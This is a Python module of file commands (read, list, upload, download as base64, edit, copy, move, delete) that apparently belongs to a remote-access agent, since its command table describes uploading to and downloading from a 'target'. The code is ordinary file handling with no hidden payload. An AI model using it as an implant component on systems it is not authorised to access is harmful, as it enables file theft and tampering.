"""File operations module."""

import base64
import os
import shutil
import stat
import time

NAME = "fileops"


def cmd_cat(path: str) -> dict:
    with open(path, "r", errors="replace") as f:
        return {"content": f.read(), "path": os.path.abspath(path)}


def cmd_head(path: str, lines: int = 10) -> dict:
    with open(path, "r", errors="replace") as f:
        content = "".join(f.readline() for _ in range(lines))
    return {"content": content, "path": os.path.abspath(path), "lines": lines}


def cmd_tail(path: str, lines: int = 10) -> dict:
    with open(path, "r", errors="replace") as f:
        all_lines = f.readlines()
    content = "".join(all_lines[-lines:])
    return {"content": content, "path": os.path.abspath(path), "lines": lines}


def _format_entry(path: str, name: str) -> dict:
    full = os.path.join(path, name)
    try:
        st = os.stat(full)
        return {
            "name": name,
            "type": "dir" if stat.S_ISDIR(st.st_mode) else "file",
            "size": st.st_size,
            "mode": oct(st.st_mode)[-4:],
            "uid": st.st_uid,
            "gid": st.st_gid,
            "modified": time.strftime("%Y-%m-%d %H:%M", time.localtime(st.st_mtime)),
        }
    except OSError:
        return {"name": name, "type": "unknown"}


def cmd_ls(path: str = ".", all: bool = False, long: bool = False) -> dict:
    entries = os.listdir(path)
    if not all:
        entries = [e for e in entries if not e.startswith(".")]
    entries.sort()
    if long:
        items = [_format_entry(path, e) for e in entries]
    else:
        items = entries
    return {"path": os.path.abspath(path), "entries": items, "count": len(entries)}


def cmd_upload(name: str, data_b64: str) -> dict:
    raw = base64.b64decode(data_b64)
    with open(name, "wb") as f:
        f.write(raw)
    return {"path": os.path.abspath(name), "size": len(raw)}


def cmd_download(path: str) -> dict:
    with open(path, "rb") as f:
        raw = f.read()
    return {"path": os.path.abspath(path), "size": len(raw), "data_b64": base64.b64encode(raw).decode()}


def cmd_edit(path: str, content: str) -> dict:
    with open(path, "w") as f:
        f.write(content)
    return {"path": os.path.abspath(path), "size": len(content)}


def cmd_cp(src: str, dst: str) -> dict:
    if os.path.isdir(src):
        shutil.copytree(src, dst)
    else:
        shutil.copy2(src, dst)
    return {"src": os.path.abspath(src), "dst": os.path.abspath(dst)}


def cmd_mv(src: str, dst: str) -> dict:
    shutil.move(src, dst)
    return {"src": src, "dst": os.path.abspath(dst)}


def cmd_rm(path: str, recursive: bool = False) -> dict:
    if os.path.isdir(path) and recursive:
        shutil.rmtree(path)
    else:
        os.remove(path)
    return {"removed": path}


def cmd_mkdir(path: str) -> dict:
    os.makedirs(path, exist_ok=True)
    return {"created": os.path.abspath(path)}


def cmd_touch(path: str) -> dict:
    with open(path, "a"):
        os.utime(path, None)
    return {"path": os.path.abspath(path)}


COMMANDS = {
    "cat": {"handler": cmd_cat, "description": "Read file contents"},
    "head": {"handler": cmd_head, "description": "Read first N lines"},
    "tail": {"handler": cmd_tail, "description": "Read last N lines"},
    "ls": {"handler": cmd_ls, "description": "List directory contents"},
    "upload": {"handler": cmd_upload, "description": "Upload file to target"},
    "download": {"handler": cmd_download, "description": "Download file from target"},
    "edit": {"handler": cmd_edit, "description": "Write content to file"},
    "cp": {"handler": cmd_cp, "description": "Copy file"},
    "mv": {"handler": cmd_mv, "description": "Move/rename file"},
    "rm": {"handler": cmd_rm, "description": "Delete file"},
    "mkdir": {"handler": cmd_mkdir, "description": "Create directory"},
    "touch": {"handler": cmd_touch, "description": "Create empty file"},
}
